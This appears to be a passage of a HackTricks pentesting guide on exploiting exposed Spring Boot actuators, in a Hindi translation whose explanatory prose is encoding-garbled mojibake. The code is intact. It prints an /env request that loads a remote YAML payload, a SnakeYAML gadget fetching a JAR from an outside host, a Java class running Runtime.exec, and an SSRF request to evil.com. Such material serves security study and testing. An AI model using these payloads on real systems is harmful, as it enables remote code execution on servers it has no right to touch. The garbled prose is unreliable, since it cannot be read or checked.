рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдФрд░ рднреА рд░реБрдЪрд┐рдХрд░ рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реИрдВ, рд▓реЗрдХрд┐рди, рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд░реВрдк рдореЗрдВ, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИрдВ:

**spring.datasource.url** - рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ)

**spring.datasource.jndiName** - рдбреЗрдЯрд╛рдмреЗрд╕ JNDI рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ)

**spring.datasource.tomcat.dataSourceJNDI** - рдбреЗрдЯрд╛рдмреЗрд╕ JNDI рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдХрднреА рднреА рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреНрд▓рд╛рдЙрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ рдпреВрдЖрд░рдЖрдИ (рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ)

рдЗрди рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рддрдХ '/restart' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдХреЙрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕рднреА ApplicationContext рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдмрд╣реБрдд рд╕рд╛рд░реА рдФрд░ рднреА рд░реБрдЪрд┐рдХрд░ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдирдореЗрдВ рд╕реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рддрддреНрдкрд░рддрд╛ рдХреЗ рдмрд╛рдж рддреБрд░рдВрдд рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

**рдиреЛрдЯ:** Spring Boot 2x рдореЗрдВ, '/env' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░реВрдк рдереЛрдбрд╝рд╛ рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИ (рдпрд╣ json рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рд╡рд┐рдЪрд╛рд░ рдПрдХ рд╣реА рд╣реИред

**рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╡рд┐рдХрд▓реНрдк:**

рдпрджрд┐ рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдореИрдВрдиреЗ [рдЕрдкрдиреЗ Github рдкреЗрдЬ рдкрд░ рдПрдХ рд╕рд░рд▓ Spring Boot рдЕрдиреБрдкреНрд░рдпреЛрдЧ](https://github.com/artsploit/actuator-testbed) рдмрдирд╛рдпрд╛ рд╣реИред рд╕рднреА рдкреЗрд▓реЛрдб рд╡рд╣рд╛рдВ рдХрд╛рдо рдХрд░реЗрдВрдЧреЗ, рдХреЗрд╡рд▓ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ (рдЬрдм рддрдХ рдЖрдк рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рди рдХрд░реЗрдВ)ред

**рдмреНрд▓реИрдХ рдмреЙрдХреНрд╕ рдбрд┐рд╕реНрдХрд╡рд░реА:**

рдпрд╣рд╛рдВ [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдХреНрдЯреБрдПрдЯрд░реНрд╕ рдХреА
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
рдпрд╣ рдЕрдиреБрд░реЛрдз 'spring.cloud.bootstrap.location' рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рд╣рд░реА рдХреЙрдиреНрдлрд╝рд┐рдЧ рд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ YAML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рд╕рдВрднрд╡ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ '/refresh' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рднреА рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
рдЬрдм рдпрд╛рдорд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЗрд╕реЗ SnakeYAML рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рд╛рде рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред рдкреЗрд▓реЛрдб (yaml-payload.yml) рдЙрдкрд░реЛрдХреНрдд Marshalsec рдЕрдиреБрд╕рдВрдзрд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреА рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рджрд┐рдП рдЧрдП URLClassLoader рдХреЗ рд╕рд╛рде ScriptEngineManager рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рддреА рд╣реИред рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ **'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'** рд╡рд┐рдзрд┐, рдЬреЛ рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рд╕рднреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдореЗрдВ 'ScriptEngineFactory' рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЗ рд╕рднреА рдЕрдиреБрдорд╛рдирд┐рдд рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиреЛрдВ рдХреЛ рдвреВрдВрдврдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИред рд╣рдо URLClassLoader рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдирдИ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рдирдП 'ScriptEngineFactory' рдХреЗ рд╕рд╛рде рджреБрд╖реНрдЯ рдмрд╛рдЗрдЯрдХреЛрдб рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдирд┐рд╡рд╛рд░реНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдЬрд╛рд░ рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдмрд╛рдЗрдЯрдХреЛрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдирд┐рд░реНрдорд╛рдгрдХрд░реНрддрд╛ рдореЗрдВ рджреБрд╖реНрдЯ рдкреЗрд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) рдХреЗрд╡рд▓ рдПрдХ рдкреВрд░реНрдг рд╕рдВрджрд░реНрдн 'artsploit.AwesomeScriptEngineFactory' рдХреЛ рд╕рдореЗрдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдкрд╛рда рдлрд╝рд╛рдЗрд▓ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рддрд╛рдХрд┐ рд╕реЗрд╡рд╛ рд▓реЛрдбрд░ рдХреЛ рдкрддрд╛ рдЪрд▓ рд╕рдХреЗ рдХрд┐ рдХрд╣рд╛рдВ рдХрдХреНрд╖рд╛ рдХреЛ рдвреВрдВрдвреЗрдВ: **artsploit.AwesomeScriptEngineFactory** рдлрд┐рд░ рд╕реЗ, рдЗрд╕ рд╢реЛрд╖рдг рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреНрд▓рд╛рдЙрдб рдХреЛ рдХреНрд▓рд╛рд╕рдкрде рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди Eureka рдХреЗ XStream рдкреЗрд▓реЛрдб рдХреА рддреБрд▓рдирд╛ рдореЗрдВ, рдпрд╣ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЖрдк рдореЗрд░реЗ github рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдкреВрд░рд╛ рдкреЗрд▓реЛрдб рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

рдпрд╣ рдкреГрд╖реНрда рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ /env + H2 рдХреЗ рд╕рдВрдпреЛрдЬрди рдХреЛ рдХреИрд╕реЗ рд╢реЛрд╖рдг рдХрд░реЗрдВ: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## рдЧрд▓рдд рдкрд╛рдердирд╛рдо рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдкреНрд░рд┐рдВрдЧ рдмреВрдЯ рдкрд░ SSRF <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**рдЗрд╕ рд╢реЛрдз рд╕реЗ**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): рд╕реНрдкреНрд░рд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ рдкрд╣рд▓реЗ рд╕реНрд▓реИрд╢ рдХреЗ рдкрд╣рд▓реЗ рдореИрдЯреНрд░рд┐рдХреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд┐рднрд╛рдЬрди рд╡рд░реНрдг `;` рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ HTTP рдкрд╛рдердирд╛рдо рдХрд╛:
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
рдПрдХ рдРрд╕реЗ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

рд╕реЛрдЪреЗрдВ рдХрд┐ рд╕реНрдкреНрд░рд┐рдВрдЧ рдХреЛ рдореИрдЯреНрд░рд┐рдХреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд┐рднрд╛рдЬрдХ рдХреЗ рдмрд╛рдж рдХрд┐рд╕реА рднреА рд╡рд░реНрдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ `@` рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд┐рд╕реА рднреА рдЕрдирд┐рд╢реНрдЪрд┐рдд рдЕрдВрддрдмрд┐рдВрджреБ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдиреАрдЪреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдЕрдиреБрд░реЛрдз рд╣реИ:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
